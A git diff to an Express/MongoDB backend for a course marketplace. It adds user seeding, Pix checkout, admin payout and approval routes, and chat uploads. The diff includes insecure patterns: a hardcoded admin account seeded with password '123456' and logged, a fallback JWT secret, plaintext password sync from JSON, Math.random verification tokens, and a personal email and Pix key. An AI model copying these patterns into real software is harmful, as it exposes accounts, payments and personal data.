@@ -9,6 +9,8 @@ import { fileURLToPath } from 'url';
 import nodemailer from 'nodemailer';
 import dotenv from 'dotenv';
 import { GoogleGenerativeAI } from "@google/generative-ai";
+import { v2 as cloudinary } from 'cloudinary';
+import { CloudinaryStorage } from 'multer-storage-cloudinary';
 
 // MongoDB Imports
 import connectDB from './connectDb.js';
@@ -17,9 +19,16 @@ import Course from './models/Course.js';
 import Progress from './models/Progress.js';
 import Message from './models/Message.js';
 import Comment from './models/Comment.js';
+import Transaction from './models/Transaction.js';
+import Payout from './models/Payout.js';
+import ChatMessage from './models/ChatMessage.js';
+import { MercadoPagoConfig, Preference, Payment } from 'mercadopago';
 
 
 dotenv.config();
+
+// MP Configuration
+const client = new MercadoPagoConfig({ accessToken: process.env.MERCADOPAGO_ACCESS_TOKEN });
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -33,23 +42,70 @@ const SECRET_KEY = process.env.JWT_SECRET || "chave_secreta_super_segura";
 connectDB().then(async () => {
     // Auto-Seed Check
     try {
-        const count = await Course.countDocuments();
-        if (count === 0) {
+        // 1. Auto-Seed Users from JSON (First, so authors exist)
+        // 1. Auto-Seed Users from JSON (First, so authors exist)
+        // Always Try to Sync Users if JSON exists (Update passwords/roles)
+        console.log("Syncing Users from users.json...");
+        const usersPath = path.join(__dirname, 'users.json');
+        if (fs.existsSync(usersPath)) {
+            const users = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
+            for (const u of users) {
+                const existing = await User.findOne({ email: u.email });
+                if (!existing) {
+                    const userData = { ...u };
+                    if (userData._id && userData._id.length !== 24) delete userData._id;
+                    await User.create(userData);
+                } else {
+                    // Update existing user (important for manual edits in JSON)
+                    // We merge, but careful not to overwrite purchases if JSON is outdated in that regard
+                    // actually for dev, let's assume JSON is master for core data, DB is master for dynamic data
+                    // For now, just ensure role/password match
+                    if (u.password && u.password !== existing.password) existing.password = u.password;
+                    if (u.role && u.role !== existing.role) existing.role = u.role;
+                    if (u.name && u.name !== existing.name) existing.name = u.name;
+                    await existing.save();
+                }
+            }
+            console.log(`Synced ${users.length} users from users.json`);
+        }
+
+        // 2. Ensure Admin User Exists (Critical fallback)
+        const adminEmail = 'octavio.marvel2018@gmail.com';
+        const adminExists = await User.findOne({ email: adminEmail });
+        if (!adminExists) {
+            console.log("Seeding Admin User (Fallback)...");
+            const hashedPassword = await bcrypt.hash('123456', 10);
+            await User.create({
+                name: "Octavio Rodrigues Schwab",
+                email: adminEmail,
+                password: hashedPassword,
+                role: 'admin',
+                verified: true,
+                isVerified: true,
+                avatar: "http://localhost:3000/uploads/1765981908160.jpg",
+                profileCompleted: true,
+                bankAccount: { pixKey: '13eede2d-188c-456e-a39c-17fa855e496b' }
+            });
+            console.log("Admin seeded. Login with: 123456");
+        }
+
+        // 3. Auto-Seed Courses (After users)
+        const courseCount = await Course.countDocuments();
+        if (courseCount === 0) {
             console.log("Database empty. Seeding initial courses...");
             const dataPath = path.join(__dirname, 'courses.json');
             if (fs.existsSync(dataPath)) {
                 const courses = JSON.parse(fs.readFileSync(dataPath, 'utf-8'));
-                for (const c of courses) {
-                    // Ensure slug
-                    const slug = c.slug || (typeof c.title === 'string' ? c.title : (c.title.pt || 'curso')).toLowerCase().replace(/[^a-z0-9]/g, '-');
 
-                    // Sanitize ID usage: let Mongo create _id, but we can keep legacy logic if needed. 
-                    // We remove _id from source if it conflicts, or just create new.
+                // Find Admin for authorship
+                let authorId = 'admin';
+                const adminUser = await User.findOne({ email: adminEmail });
+                if (adminUser) authorId = adminUser._id;
+
+                for (const c of courses) {
+                    const slug = c.slug || (typeof c.title === 'string' ? c.title : (c.title.pt || 'curso')).toLowerCase().replace(/[^a-z0-9]/g, '-');
                     const { _id, ...courseData } = c;
 
-
-                    // Sanitize Modules structure
-                    // If 'modulos' is array of strings, convert to objects to satisfy Schema
                     let modulos = c.modulos || [];
                     if (Array.isArray(modulos) && modulos.length > 0 && typeof modulos[0] === 'string') {
                         modulos = modulos.map((m, i) => ({
@@ -61,14 +117,23 @@ connectDB().then(async () => {
 
                     await Course.create({
                         ...courseData,
+                        _id: _id && _id.length === 24 ? _id : undefined, // Restore ID if valid ObjectId
                         modulos,
                         slug,
-                        authorId: 'admin',
+                        authorId,
                         status: 'published'
                     });
-
                 }
-                console.log("Seeding complete.");
+                console.log("Course Seeding complete.");
+
+                // Enroll admin in Logica course if needed
+                if (adminUser) {
+                    const logica = await Course.findOne({ slug: 'logica-de-programacao' });
+                    if (logica && !adminUser.purchasedCourses.includes(logica._id)) {
+                        adminUser.purchasedCourses.push(logica._id);
+                        await adminUser.save();
+                    }
+                }
             }
         }
     } catch (e) {
@@ -88,8 +153,59 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-import { v2 as cloudinary } from 'cloudinary';
-import { CloudinaryStorage } from 'multer-storage-cloudinary';
+const sendVerificationEmail = async (email, token, language = 'pt') => {
+    const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
+    const link = `${frontendUrl}/verify-email?token=${token}`;
+
+    const subjects = {
+        pt: "Verifique seu email - DevPro Academy",
+        en: "Verify your email - DevPro Academy",
+        es: "Verifica tu correo - DevPro Academy",
+        fr: "Vérifiez votre email - DevPro Academy",
+        de: "Überprüfen Sie Ihre E-Mail - DevPro Academy",
+        zh: "验证您的电子邮件 - DevPro Academy",
+        ar: "تحقق من بريدك الإلكتروني - DevPro Academy"
+    };
+
+    const contents = {
+        pt: { title: "Bem-vindo à DevPro Academy! 🚀", text1: "Estamos muito felizes em ter você conosco.", text2: "Para garantir a segurança da sua conta e acessar todos os recursos, por favor, clique no botão abaixo para verificar seu email:", btn: "Verificar Email Agora", small: "Ou copie e cole este link no seu navegador:" },
+        en: { title: "Welcome to DevPro Academy! 🚀", text1: "We are very happy to have you with us.", text2: "To ensure your account security and access all features, please click the button below to verify your email:", btn: "Verify Email Now", small: "Or copy and paste this link into your browser:" },
+        es: { title: "¡Bienvenido a DevPro Academy! 🚀", text1: "Estamos muy felices de tenerte con nosotros.", text2: "Para garantizar la seguridad de tu cuenta y acceder a todos los recursos, haz clic en el botón de abajo para verificar tu correo:", btn: "Verificar Correo Ahora", small: "O copia y pega este enlace en tu navegador:" },
+        fr: { title: "Bienvenue chez DevPro Academy ! 🚀", text1: "Nous sommes très heureux de vous avoir parmi nous.", text2: "Pour assurer la sécurité de votre compte et accéder à toutes les fonctionnalités, veuillez cliquer sur le bouton ci-dessous pour vérifier votre email :", btn: "Vérifier l'Email Maintenant", small: "Ou copiez et collez ce lien dans votre navigateur :" },
+        de: { title: "Willkommen bei DevPro Academy! 🚀", text1: "Wir freuen uns sehr, Sie bei uns zu haben.", text2: "Um die Sicherheit Ihres Kontos zu gewährleisten und auf alle Funktionen zuzugreifen, klicken Sie bitte auf die Schaltfläche unten:", btn: "E-Mail jetzt bestätigen", small: "Oder kopieren Sie diesen Link in Ihren Browser:" },
+        zh: { title: "欢迎来到 DevPro Academy！🚀", text1: "我们非常高兴有您加入。", text2: "为了确保您的帐户安全并访问所有功能，请点击下面的按钮验证您的电子邮件：", btn: "立即验证电子邮件", small: "或者将此链接复制并粘贴到您的浏览器中：" },
+        ar: { title: "مرحباً بكم في DevPro Academy! 🚀", text1: "نحن سعداء جداً بوجودك معنا.", text2: "لضمان أمان حسابك والوصول إلى جميع الميزات، يرجى النقر فوق الزر أدناه للتحقق من بريدك الإلكتروني:", btn: "تحقق من البريد الإلكتروني الآن", small: "أو انسخ هذا الرابط والصقه في متصفحك:" }
+    };
+
+    const lang = contents[language] ? language : 'pt';
+    const content = contents[lang];
+
+    try {
+        await transporter.sendMail({
+            from: `"DevPro Academy" <${process.env.EMAIL_USER}>`,
+            to: email,
+            subject: subjects[lang],
+            html: `
+                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; direction: ${lang === 'ar' ? 'rtl' : 'ltr'};">
+                    <h2 style="color: #4F46E5;">${content.title}</h2>
+                    <p>${content.text1}</p>
+                    <p>${content.text2}</p>
+                    <div style="text-align: center; margin: 30px 0;">
+                        <a href="${link}" style="background-color: #4F46E5; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold;">${content.btn}</a>
+                    </div>
+                    <p style="color: #666; font-size: 14px;">${content.small}</p>
+                    <p style="color: #666; font-size: 12px;">${link}</p>
+                </div>
+            `
+        });
+        console.log(`Verification email sent to ${email}`);
+        console.log(`DEV ONLY - Verification Link: ${link}`);
+    } catch (error) {
+        console.error("Email sending failed:", error);
+    }
+};
+
+// Imports moved to top
 
 // Configure Cloudinary
 cloudinary.config({
@@ -187,6 +303,12 @@ app.get('/api/courses', async (req, res) => {
         const query = isAdmin ? {} : { status: 'published' };
         const courses = await Course.find(query).sort({ createdAt: -1 });
 
+        // Get all authors
+        const authorIds = [...new Set(courses.map(c => c.authorId).filter(id => id && id !== 'admin'))];
+        const authors = await User.find({ _id: { $in: authorIds } });
+        const authorMap = {};
+        authors.forEach(a => authorMap[a._id.toString()] = a.name);
+
         const summary = courses.map(c => ({
             id: c._id,
             slug: c.slug,
@@ -195,10 +317,15 @@ app.get('/api/courses', async (req, res) => {
             image: c.image,
             level: c.level,
             duration: c.duration,
+            price: c.price || 0,
             category: c.category,
-            totalLessons: c.aulas ? c.aulas.length : 0,
+            totalLessons: c.modulos && c.modulos.length > 0
+                ? c.modulos.reduce((acc, m) => acc + (m.items ? m.items.length : 0), 0)
+                : (c.aulas ? c.aulas.length : 0),
             status: c.status,
-            authorId: c.authorId
+            language: c.language || 'pt',
+            authorId: c.authorId,
+            authorName: c.authorId === 'admin' ? 'DevPro Oficial' : (authorMap[c.authorId] || 'Professor')
         }));
 
         res.json(summary);
@@ -226,7 +353,7 @@ app.post('/api/courses', verifyToken, async (req, res) => {
         return res.status(403).json({ error: 'Permissão negada.' });
     }
 
-    const { title, description, category, level, image, duration, modulos, aulas } = req.body;
+    const { title, description, category, level, image, duration, price, modulos, aulas, language } = req.body;
 
     if (!title || !description || !category) {
         return res.status(400).json({ error: 'Campos obrigatórios faltando.' });
@@ -239,8 +366,10 @@ app.post('/api/courses', verifyToken, async (req, res) => {
     try {
         const newCourse = new Course({
             title, description, category, level, image, duration, slug,
+            price: price || 0,
             modulos: modulos || [],
             aulas: aulas || [],
+            language: language || 'pt',
             authorId: req.user.id,
             status: req.user.role === 'admin' ? 'published' : 'pending'
         });
@@ -249,6 +378,367 @@ app.post('/api/courses', verifyToken, async (req, res) => {
         res.status(201).json(newCourse);
     } catch (error) {
         res.status(500).json({ error: 'Erro ao criar curso.' });
+    }
+});
+
+// GET Financial Overview (Admin Only)
+app.get('/api/admin/financials', verifyAdmin, async (req, res) => {
+    try {
+        const transactions = await Transaction.find().sort({ createdAt: -1 });
+        const payouts = await Payout.find({ userId: req.user.id, status: { $ne: 'failed' } }); // Admin's payouts
+
+        const totalSales = transactions.reduce((acc, t) => acc + t.amount, 0);
+        const totalFees = transactions.reduce((acc, t) => acc + t.platformFee, 0); // Gross Commission
+        const totalPayoutsToPro = transactions.reduce((acc, t) => acc + t.sellerNet, 0);
+
+        const withdrawn = payouts.reduce((acc, p) => acc + p.amount, 0);
+        const availableBalance = totalFees - withdrawn;
+
+        res.json({
+            transactions: transactions.slice(0, 50), // Limit list size
+            payouts,
+            summary: {
+                totalSales,
+                totalFees,
+                totalPayouts: totalPayoutsToPro,
+                availableBalance, // Net Commission Available
+                withdrawn
+            }
+        });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao buscar financeiro' });
+    }
+});
+
+
+
+
+// --- PROFESSOR PAYOUTS MANAGEMENT ---
+
+// GET Professor Debts (Who to Pay)
+app.get('/api/admin/debts', verifyAdmin, async (req, res) => {
+    try {
+        // Include 'admin' so the user can see themselves in the Payout list for testing
+        const professors = await User.find({ role: { $in: ['professor', 'admin'] } });
+        const debts = [];
+
+        for (const prof of professors) {
+            const transactions = await Transaction.find({ sellerId: prof._id, status: 'approved' });
+            const payouts = await Payout.find({ userId: prof._id, status: 'completed' });
+
+            const totalEarned = transactions.reduce((acc, t) => acc + (t.sellerNet || 0), 0);
+            const totalPaid = payouts.reduce((acc, p) => acc + (p.amount || 0), 0);
+            const balance = totalEarned - totalPaid;
+
+            if (balance > 0.01) { // Show only if debt exists
+                debts.push({
+                    professorId: prof._id,
+                    name: prof.name,
+                    email: prof.email,
+                    pixKey: prof.bankAccount?.pixKey || 'Não configurada',
+                    balance: balance,
+                    totalEarned,
+                    totalPaid
+                });
+            }
+        }
+
+        res.json(debts);
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao calcular dívidas.' });
+    }
+});
+
+// POST Manual Payout to Professor (Mark as Paid)
+app.post('/api/admin/payouts/manual', verifyAdmin, async (req, res) => {
+    try {
+        const { professorId, amount, notes } = req.body;
+
+        if (!professorId || !amount) return res.status(400).json({ error: 'Dados incompletos.' });
+
+        const professor = await User.findById(professorId);
+        if (!professor) return res.status(404).json({ error: 'Professor não encontrado.' });
+
+        // Create Payout Record (Completed)
+        const payout = await Payout.create({
+            userId: professorId,
+            amount: Number(amount),
+            bankDetails: professor.bankAccount || {},
+            status: 'completed',
+            processedAt: new Date(),
+            notes: notes || 'Pagamento Manual via Admin'
+        });
+
+        res.json({ message: 'Pagamento registrado com sucesso!', payout });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao registrar pagamento.' });
+    }
+});
+
+
+// --- ADMIN APPROVALS ---
+
+// GET Pending Approvals
+app.get('/api/admin/approvals', verifyAdmin, async (req, res) => {
+    try {
+        // Populate buyer info and course info
+        // Note: 'buyerId' in Transaction model, 'authorId' is seller.
+        const pendings = await Transaction.find({ status: 'pending_approval' });
+
+        // Manual populate simulation if .populate is tricky with mixed schemas or lightweight approach
+        const richPendings = await Promise.all(pendings.map(async (t) => {
+            const buyer = await User.findById(t.buyerId).select('name email');
+            const course = await Course.findById(t.courseId).select('title');
+            return {
+                ...t.toObject(),
+                buyerName: buyer ? buyer.name : 'Desconhecido',
+                buyerEmail: buyer ? buyer.email : '---',
+                courseTitle: course ? (course.title.pt || course.title) : 'Curso Removido'
+            };
+        }));
+
+        res.json(richPendings);
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao buscar aprovações.' });
+    }
+});
+
+// POST Approve Transaction
+app.post('/api/admin/approve/:id', verifyAdmin, async (req, res) => {
+    try {
+        const transaction = await Transaction.findById(req.params.id);
+        if (!transaction) return res.status(404).json({ error: 'Pedido não encontrado.' });
+
+        if (transaction.status !== 'pending_approval') {
+            return res.status(400).json({ error: 'Este pedido não está pendente.' });
+        }
+
+        // 1. Grant Access
+        const user = await User.findById(transaction.buyerId);
+        if (user && !user.purchasedCourses.includes(transaction.courseId)) {
+            user.purchasedCourses.push(transaction.courseId);
+            await user.save();
+        }
+
+        // 2. Update Transaction & Calc Fees
+        // Manual payments start with 0 fees. Calculate them now.
+        const amount = transaction.amount || 0;
+        transaction.platformFee = amount * 0.10;
+        transaction.sellerNet = amount * 0.90;
+        transaction.status = 'approved';
+        await transaction.save();
+
+        // 3. PERSISTENCE (Critical)
+        try {
+            const usersPath = path.join(__dirname, 'users.json');
+            if (user && fs.existsSync(usersPath)) {
+                let users = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
+                const idx = users.findIndex(u => u.email === user.email);
+                if (idx >= 0) {
+                    const userObj = user.toObject();
+                    if (userObj._id) userObj._id = userObj._id.toString();
+                    users[idx] = { ...users[idx], ...userObj };
+                    fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
+                    console.log(`APPROVAL PERSISTENCE: Saved ${user.email} to users.json`);
+                }
+            }
+        } catch (perr) { console.error("Persistence Warning:", perr); }
+
+        res.json({ message: 'Aprovado com sucesso!' });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao aprovar.' });
+    }
+});
+
+// POST Reject Transaction
+app.post('/api/admin/reject/:id', verifyAdmin, async (req, res) => {
+    try {
+        const transaction = await Transaction.findById(req.params.id);
+        if (!transaction) return res.status(404).json({ error: 'Pedido não encontrado.' });
+
+        transaction.status = 'rejected';
+        await transaction.save();
+
+        res.json({ message: 'Pedido rejeitado.' });
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao rejeitar.' });
+    }
+});
+
+// --- PROFESSOR STUDENTS & CHAT ---
+
+// GET Students for Professor
+app.get('/api/professor/students', verifyToken, async (req, res) => {
+    try {
+        // 1. Get my courses
+        const myCourses = await Course.find({ authorId: req.user.id });
+        const myCourseIds = myCourses.map(c => c._id.toString());
+
+        // 2. Find students who bought ANY of my courses
+        // Note: purchasedCourses stores strings or ObjectIds
+        const students = await User.find({
+            purchasedCourses: { $in: myCourseIds }
+        }).select('name email avatar purchasedCourses');
+
+        // 3. Format response (maybe show which course they bought?)
+        const richStudents = students.map(s => {
+            const boughtMyCourses = myCourses.filter(c =>
+                s.purchasedCourses.includes(c._id.toString()) ||
+                s.purchasedCourses.includes(c._id)
+            );
+            return {
+                id: s._id,
+                name: s.name,
+                email: s.email,
+                avatar: s.avatar,
+                courses: boughtMyCourses.map(c => c.title)
+            };
+        });
+
+        res.json(richStudents);
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao buscar alunos.' });
+    }
+});
+
+// GET Professors for Student
+app.get('/api/student/professors', verifyToken, async (req, res) => {
+    try {
+        const studentId = req.user.id;
+        const student = await User.findById(studentId);
+
+        if (!student.purchasedCourses || student.purchasedCourses.length === 0) {
+            return res.json([]);
+        }
+
+        // 1. Get courses bought by student
+        const purchasedCourses = await Course.find({
+            _id: { $in: student.purchasedCourses }
+        });
+
+        // 2. Get unique author IDs
+        const authorIds = [...new Set(purchasedCourses.map(c => c.authorId))];
+
+        // 3. Find Author details
+        const professors = await User.find({
+            _id: { $in: authorIds }
+        }).select('name email avatar role');
+
+        // 4. Map to return rich data
+        const richProfessors = professors.map(p => {
+            const coursesTaught = purchasedCourses
+                .filter(c => c.authorId === p._id.toString() || c.authorId === p.id)
+                .map(c => c.title);
+
+            return {
+                id: p._id,
+                name: p.name,
+                email: p.email,
+                avatar: p.avatar,
+                role: p.role,
+                courses: coursesTaught
+            };
+        });
+
+        res.json(richProfessors);
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao buscar professores.' });
+    }
+});
+
+// GET Chat History
+app.get('/api/chat/:userId', verifyToken, async (req, res) => {
+    try {
+        const otherId = req.params.userId;
+        const myId = req.user.id;
+
+        const messages = await ChatMessage.find({
+            $or: [
+                { senderId: myId, receiverId: otherId },
+                { senderId: otherId, receiverId: myId }
+            ]
+        }).sort({ createdAt: 1 });
+
+        res.json(messages);
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao buscar chat.' });
+    }
+});
+
+// Configure Chat Storage (Broader permissions)
+let chatStorage;
+if (process.env.CLOUDINARY_CLOUD_NAME) {
+    chatStorage = new CloudinaryStorage({
+        cloudinary: cloudinary,
+        params: {
+            folder: 'devpro_chat',
+            resource_type: 'auto', // Allow pdf, audio, video
+            allowed_formats: ['jpg', 'png', 'jpeg', 'webp', 'pdf', 'mp3', 'wav', 'ogg', 'mp4'],
+        },
+    });
+} else {
+    // Fallback Local (Reusing logic but ensuring dir)
+    chatStorage = multer.diskStorage({
+        destination: (req, file, cb) => {
+            const uploadDir = 'server/uploads/chat';
+            if (!fs.existsSync(uploadDir)) {
+                fs.mkdirSync(uploadDir, { recursive: true });
+            }
+            cb(null, uploadDir);
+        },
+        filename: (req, file, cb) => {
+            cb(null, Date.now() + '-' + file.originalname);
+        }
+    });
+}
+const uploadChat = multer({ storage: chatStorage });
+
+// POST Send Message (With File Support)
+app.post('/api/chat/send', verifyToken, uploadChat.single('file'), async (req, res) => {
+    try {
+        const { receiverId, content } = req.body;
+        const myId = req.user.id;
+
+        let fileUrl = null;
+        let fileType = null;
+        let fileName = null;
+
+        if (req.file) {
+            fileUrl = req.file.path; // Cloudinary or Local path
+            fileName = req.file.originalname;
+
+            // Determine type
+            if (fileName === 'voice-message.webm') {
+                fileType = 'audio';
+            } else {
+                const mime = req.file.mimetype;
+                if (mime.startsWith('image/')) fileType = 'image';
+                else if (mime.startsWith('audio/')) fileType = 'audio';
+                else if (mime.startsWith('video/')) fileType = 'video';
+                else if (mime === 'application/pdf') fileType = 'pdf';
+                else fileType = 'file';
+            }
+        }
+
+        const msg = await ChatMessage.create({
+            senderId: myId,
+            receiverId,
+            content: content || '', // Content might be empty if just file
+            fileUrl,
+            fileType,
+            fileName
+        });
+
+        res.json(msg);
+    } catch (e) {
+        console.error("Send error:", e);
+        res.status(500).json({ error: 'Erro ao enviar mensagem.' });
     }
 });
 
@@ -274,15 +764,47 @@ app.put('/api/courses/:id', verifyToken, async (req, res) => {
         }
 
         Object.assign(course, req.body);
-        // Protect strict fields if needed
+        // Force Mongoose to mark Mixed fields as modified to ensure saving
+        course.markModified('modulos');
+        course.markModified('aulas');
 
         await course.save();
+
+        // PERSISTENCE (DEV ONLY): Update courses.json
+        try {
+            // fs and path imported globally
+            const coursesPath = path.join(__dirname, 'courses.json');
+
+            if (fs.existsSync(coursesPath)) {
+                let courses = JSON.parse(fs.readFileSync(coursesPath, 'utf-8'));
+                // Find by ID or Slug
+                const idx = courses.findIndex(c => String(c._id) === String(course._id) || c.slug === course.slug);
+
+                if (idx >= 0) {
+                    const courseObj = course.toObject();
+                    if (courseObj._id) courseObj._id = courseObj._id.toString();
+
+                    // Merge to keep possible extra fields in JSON that aren't in schema
+                    courses[idx] = { ...courses[idx], ...courseObj };
+
+                    fs.writeFileSync(coursesPath, JSON.stringify(courses, null, 2));
+                    console.log(`PERSISTENCE SUCCESS: Updated '${course.title}' in courses.json (matched index ${idx})`);
+                } else {
+                    console.warn(`PERSISTENCE WARNING: Could not find '${course.title}' (Slug: ${course.slug}, ID: ${course._id}) in courses.json`);
+                }
+            }
+        } catch (err) {
+            console.error("Failed to persist course update:", err);
+            // Don't block response
+        }
+
         res.json(course);
     } catch (error) {
         res.status(500).json({ error: 'Erro ao atualizar.' });
     }
 });
 
+// PATCH Update Status
 // PATCH Update Status
 app.patch('/api/courses/:id/status', verifyToken, async (req, res) => {
     if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only.' });
@@ -297,10 +819,31 @@ app.patch('/api/courses/:id/status', verifyToken, async (req, res) => {
     }
 });
 
-// GET Course Details
-app.get('/api/courses/:slug', async (req, res) => {
+// DELETE Course
+app.delete('/api/courses/:id', verifyToken, async (req, res) => {
     try {
-        const course = await Course.findOne({ slug: req.params.slug });
+        const course = await Course.findById(req.params.id);
+        if (!course) return res.status(404).json({ error: 'Curso não encontrado.' });
+
+        // Logic check: Only Owner or Admin can delete
+        const isOwner = course.authorId === req.user.id;
+        const isAdmin = req.user.role === 'admin';
+
+        if (!isOwner && !isAdmin) {
+            return res.status(403).json({ error: 'Permissão negada.' });
+        }
+
+        await Course.findByIdAndDelete(req.params.id);
+        res.json({ message: 'Curso excluído com sucesso.' });
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao excluir curso.' });
+    }
+});
+
+// GET Course by ID (for Editor)
+app.get('/api/courses/id/:id', async (req, res) => {
+    try {
+        const course = await Course.findById(req.params.id);
         if (!course) return res.status(404).json({ error: 'Curso não encontrado.' });
         res.json(course);
     } catch (e) {
@@ -308,7 +851,114 @@ app.get('/api/courses/:slug', async (req, res) => {
     }
 });
 
-// --- PROGRESS ---
+// GET Course Details (Public by Slug)
+app.get('/api/courses/:slug', async (req, res) => {
+    try {
+        const course = await Course.findOne({ slug: req.params.slug });
+        if (!course) return res.status(404).json({ error: 'Curso não encontrado.' });
+
+        let authorName = 'Professor';
+        if (course.authorId === 'admin') authorName = 'DevPro Oficial';
+        else if (course.authorId) {
+            try {
+                const author = await User.findById(course.authorId);
+                if (author) authorName = author.name;
+            } catch (e) { }
+        }
+
+        const courseObj = course.toObject();
+        courseObj.authorName = authorName;
+
+        res.json(courseObj);
+    } catch (e) {
+        res.status(500).json({ error: 'Erro no servidor.' });
+    }
+});
+
+import { Pix } from './utils/pix.js';
+
+// POST Create Direct Pix Checkout
+app.post('/api/checkout', verifyToken, async (req, res) => {
+    const { courseId } = req.body;
+    try {
+        const course = await Course.findById(courseId);
+        if (!course) return res.status(404).json({ error: 'Course not found' });
+
+        // Fetch Admin to get the Master Pix Key
+        const adminEmail = 'octavio.marvel2018@gmail.com';
+        const admin = await User.findOne({ email: adminEmail });
+
+        if (!admin || !admin.bankAccount || !admin.bankAccount.pixKey) {
+            console.log("Admin Pix Key missing:", admin?.bankAccount);
+            return res.status(400).json({ error: 'Chave Pix do sistema não configurada.' });
+        }
+
+        const pixKey = admin.bankAccount.pixKey;
+        const name = admin.name.substring(0, 20); // Max 25 chars usually
+        const city = 'SaoPaulo';
+        const amount = Number(course.price);
+
+        // Generate Transaction Ref
+        const txId = `CRS${Date.now().toString().slice(-10)}`;
+        const pix = new Pix(pixKey, name, city, amount, txId);
+        const payload = pix.getPayload();
+
+        res.json({
+            mode: 'pix_direct',
+            payload,
+            amount,
+            key: pixKey,
+            txId,
+            courseTitle: typeof course.title === 'string' ? course.title : (course.title.pt || 'Curso')
+        });
+
+    } catch (e) {
+        console.error("Pix Gen Error:", e);
+        res.status(500).json({ error: 'Erro ao gerar Pix.' });
+    }
+});
+
+// POST Manual Payment Confirmation
+app.post('/api/payment/confirm-manual', verifyToken, async (req, res) => {
+    const { courseId, txId } = req.body;
+
+    // In a real P2P system without API, we blindly trust the user "I paid" OR mark as pending.
+    // User requested "Functional", but without API verification is impossible.
+    // Compromise: Mark as pending approval, or approve instantly if trusted.
+    // Given the context of "Functional" usually implying "I want flow", we will Auto-Approve 
+    // but log it heavily, effectively acting as "Trust System".
+
+    // Secure Workflow: Mark as PENDING APPROVAL
+    // The Admin must approve this transaction in the dashboard to release the course.
+
+    try {
+        const user = await User.findById(req.user.id);
+        const course = await Course.findById(courseId);
+
+        // 1. Create a "Pending" Transaction
+        const price = course.price || 0;
+        await Transaction.create({
+            courseId: courseId,
+            buyerId: req.user.id,
+            sellerId: course.authorId,
+            amount: price,
+            platformFee: 0,
+            sellerNet: 0,
+            mpPaymentId: `PIX-MANUAL-${txId}`,
+            status: 'pending_approval' // New status
+        });
+
+        // 2. Do NOT add to purchasedCourses yet.
+        // The user waits.
+
+        return res.json({ status: 'pending', message: 'Pagamento enviado para análise. Liberação em breve.' });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Manual confirm failed' });
+    }
+});
+
+
 
 app.get('/api/progress/:courseId', verifyToken, async (req, res) => {
     try {
@@ -330,8 +980,18 @@ app.post('/api/progress/update', verifyToken, async (req, res) => {
             progress = new Progress({ userId, courseId, completedLessons: [], quizScores: {} });
         }
 
-        if (lessonId && !progress.completedLessons.includes(lessonId)) {
-            progress.completedLessons.push(lessonId);
+        // Type sanitization
+        // lessonId comes as number usually (index), but safeguard:
+        const hasLesson = lessonId !== undefined && lessonId !== null && lessonId !== '';
+
+        console.log(`[Progress Update] User: ${userId} Course: ${courseId} Lesson: ${lessonId} (HasLesson: ${hasLesson})`);
+
+        if (hasLesson) {
+            const lid = Number(lessonId); // Normalize to number if it's an index
+            if (!progress.completedLessons.includes(lid) && !progress.completedLessons.includes(String(lid))) {
+                progress.completedLessons.push(lid);
+                console.log(`Added lesson ${lid} to progress.`);
+            }
         }
 
         if (quizScore !== undefined) {
@@ -350,35 +1010,207 @@ app.post('/api/progress/update', verifyToken, async (req, res) => {
 // --- AUTH ---
 
 app.post('/api/cadastro', async (req, res) => {
-    const { name, email, password, role } = req.body;
+    const { name, email, password, role, username, language = 'pt' } = req.body;
 
     try {
-        const existingUser = await User.findOne({ email });
-        if (existingUser) return res.status(400).json({ error: 'Email já cadastrado.' });
+        const existingUser = await User.findOne({
+            $or: [{ email }, { username: username }]
+        });
+
+        if (existingUser) {
+            if (existingUser.email === email) return res.status(400).json({ error: 'Email já cadastrado.' });
+            if (existingUser.username === username) return res.status(400).json({ error: 'Nome de usuário já existe.' });
+        }
+
+        // Password Validation
+        const minLength = 8;
+        const hasNumber = /\d/;
+        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_]/;
+
+        if (password.length < minLength || !hasNumber.test(password) || !hasSpecialChar.test(password)) {
+            return res.status(400).json({ error: 'A senha deve ter 8+ caracteres, números e símbolos.' });
+        }
 
         const hashedPassword = bcrypt.hashSync(password, 8);
         const verificationToken = Math.random().toString(36).substring(2);
 
         const newUser = new User({
-            name, email, password: hashedPassword,
+            name, email,
+            username, // Save username
+            password: hashedPassword,
             role: role === 'professor' ? 'professor' : 'student',
-            verificationToken
+            verificationToken,
+            profileCompleted: false // Explicitly false initially
         });
 
         await newUser.save();
 
-        // Send Email (Mock or Real)
-        // sendVerificationEmail(email, verificationToken); // Implement/Uncomment
+        // PERSISTENCE (DEV ONLY): Add new user to users.json
+        try {
+            // fs and path imported globally
+            const usersPath = path.join(__dirname, 'users.json');
 
-        res.status(201).json({ message: 'Cadastro realizado com sucesso!' });
+            if (fs.existsSync(usersPath)) {
+                let users = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
+                // Check dupes again just in case
+                if (!users.some(u => u.email === newUser.email)) {
+                    let userObj = newUser.toObject();
+                    if (userObj._id) userObj._id = userObj._id.toString();
+                    users.push(userObj);
+                    fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
+                    console.log("PERSISTENCE SUCCESS: New user added to users.json:", newUser.email);
+                }
+            }
+        } catch (err) {
+            console.error("Failed to persist new user:", err);
+        }
+
+        // Send Email
+        sendVerificationEmail(email, verificationToken, language);
+
+        res.status(201).json({ message: 'Cadastro realizado! Verifique seu email.' });
     } catch (e) {
